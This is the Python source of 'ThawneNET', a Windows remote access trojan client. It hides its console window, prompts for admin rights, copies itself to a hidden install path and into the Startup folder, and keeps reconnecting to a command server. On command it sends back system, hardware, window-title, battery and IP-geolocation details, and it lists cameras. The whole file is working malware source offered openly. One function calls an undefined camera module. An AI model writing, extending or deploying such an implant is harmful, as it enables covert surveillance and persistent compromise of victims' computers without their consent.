import ctypes
import shutil
import socket
import os
import platform
import subprocess
import sys
import time
from datetime import datetime
import config
import requests
import win32gui

import psutil
from GPUtil import GPUtil

#  _______ _                               _   _ ______ _______
# |__   __| |                             | \ | |  ____|__   __|
#    | |  | |__   __ ___      ___ __   ___|  \| | |__     | |
#    | |  | '_ \ / _` \ \ /\ / / '_ \ / _ \ . ` |  __|    | |
#    | |  | | | | (_| |\ V  V /| | | |  __/ |\  | |____   | |
#    |_|  |_| |_|\__,_| \_/\_/ |_| |_|\___|_| \_|______|  |_|
#                                        - By Cisamu


def main():
    if (config.HideConsoleWindow):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    if (config.AdminRightsRequired and not ctypes.windll.shell32.IsUserAnAdmin()):
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    if not os.path.isfile(config.InstallPath):
            # Get the full path of the currently running executable
            executable_path = os.path.abspath(sys.argv[0])
            shutil.copy(executable_path, config.InstallPath)
            os.system(f'attrib +h "{config.InstallPath}"')
            subprocess.run(config.InstallPath, shell=True)
    if (config.AutorunEnabled):
        # Get the startup folder path for the current user
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        # Copy the file to the startup folder with the desired name
        destination_file = os.path.join(startup_folder, config.AutorunName + ".exe")
        shutil.copy(config.InstallPath, destination_file)
        os.system(f'attrib +h "{destination_file}"')
    retryCount = 0
    while True:
        try:
            # Create a socket object
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Connect to the server
            client_socket.connect((config.HOST, config.PORT))
            print(f"[+] Connection Successful [Retry Count: {retryCount}]")
            client_socket.sendall(f"[+] ThawneNET Connected to {socket.gethostname()}/{os.getlogin()} [Retry Count: {retryCount}]".encode())
            while True:

                # Receive data from the server
                received_data = client_socket.recv(1024).decode()
                if (received_data.lower().startswith("info")):
                    cpu_info = platform.processor()
                    cpu_count = psutil.cpu_count(logical=False)
                    logical_cpu_count = psutil.cpu_count(logical=True)
                    memory_info = psutil.virtual_memory()
                    disk_info = psutil.disk_usage('/')
                    gpus = GPUtil.getGPUs()
                    gpuInf = """
                    """
                    if not gpus:
                        gpuInf = "No GPU detected."
                    else:
                        for i, gpu in enumerate(gpus):
                            gpuInf += f"\nGPU {i + 1} Information:"
                            gpuInf += f"\nID: {gpu.id}"
                            gpuInf += f"\nName: {gpu.name}"
                            gpuInf += f"\nDriver: {gpu.driver}"
                            gpuInf += f"\nGPU Memory Total: {gpu.memoryTotal} MB"
                            gpuInf += f"\nGPU Memory Free: {gpu.memoryFree} MB"
                            gpuInf += f"\nGPU Memory Used: {gpu.memoryUsed} MB"
                            gpuInf += f"\nGPU Load: {gpu.load * 100}%"
                            gpuInf += f"\nGPU Temperature: {gpu.temperature}°C"
                    info = f"""
    System Information:

    System: {platform.uname().system}
    Node Name: {platform.uname().node}
    Release: {platform.uname().release}
    Version: {platform.uname().version}
    Machine: {platform.uname().machine}
    Processor: {platform.uname().processor}
    User Name: {os.getlogin()}
    System time: {datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")}

    CPU Information:

    Processor: {cpu_info}
    Physical Cores: {cpu_count}
    Logical Cores: {logical_cpu_count}

    Memory Information:

    Total Memory: {memory_info.total} bytes
    Available Memory: {memory_info.available} bytes
    Used Memory: {memory_info.used} bytes"
    Memory Utilization: {memory_info.percent}%

    Disk Information:

    Total Disk Space: {disk_info.total} bytes
    Used Disk Space: {disk_info.used} bytes
    Free Disk Space: {disk_info.free} bytes
    Disk Space Utilization: {disk_info.percent}%

    {gpuInf}

    """
                    client_socket.sendall(info.encode())
                elif (received_data.lower().startswith("activewindow")):
                    hwnd = win32gui.GetForegroundWindow()
                    title = win32gui.GetWindowText(hwnd)
                    client_socket.sendall(title.encode())
                elif (received_data.lower().startswith("battery")):
                    battery = psutil.sensors_battery()
                    battery_status = "N/A"
                    battery_percent = "N/A"
                    if battery is not None:
                        battery_status = "Unknown" if battery.power_plugged else "Discharging"
                        battery_percent = battery.percent
                    client_socket.sendall(
                        f"Battery status: {battery_status}\nBattery percent: {battery_percent}%".encode())
                elif (received_data.lower().startswith("whois")):
                    try:
                        response = requests.get("http://ip-api.com/json/")
                        if response.status_code == 200:
                            data = response.json()
                        else:
                            client_socket.sendall(f"Error: {response.status_code}".encode())
                    except Exception as e:
                        client_socket.sendall(f"Error: {e}".encode())
                    if data:
                        whois = f"""
                        Information:
                        IP: {data["query"]}
                        Country: {data["country"]}
                        Country Code: {data["countryCode"]}
                        Region: {data["region"]}
                        Region Name: {data["regionName"]}
                        City: {data["city"]}
                        Zip Code: {data["zip"]}
                        Latitude: {data["lat"]}
                        Longitude: {data["lon"]}
                        Timezone: {data["timezone"]}
                        ISP: {data["isp"]}
                        Organization: {data["org"]}
                        AS: {data["as"]}
                        """
                        client_socket.sendall(whois.encode())
                    else:
                        client_socket.sendall("Failed to retrieve information.".encode())
                elif (received_data.lower().startswith("camlist")):
                    available_cameras = camera.list_available_cameras()
                    if available_cameras:
                        response = "Available Cameras:\n"
                        for cam in available_cameras:
                            response += f"Name: {cam['name']}\n"
                            response += f"Index: {cam['index']}\n"
                            response += f"FPS: {cam['fps']}\n"
                            response += f"Width: {cam['width']}\n"
                            response += f"Height: {cam['height']}\n\n"
                        client_socket.sendall(response.encode())
                    else:
                        client_socket.sendall("No cameras available.".encode())
                else:
                    client_socket.sendall(f"Unknown command {received_data} try again.".encode())

        except ConnectionRefusedError:
            retryCount += 1
            print(f"[-] Connection to the server refused [Retry Count: {retryCount}]")
            time.sleep(1)
        except Exception as e:
            retryCount += 1
            print(f"[-] An error occurred: {e} [Retry Count: {retryCount}]")
            time.sleep(1)
if __name__ == "__main__":
    main()
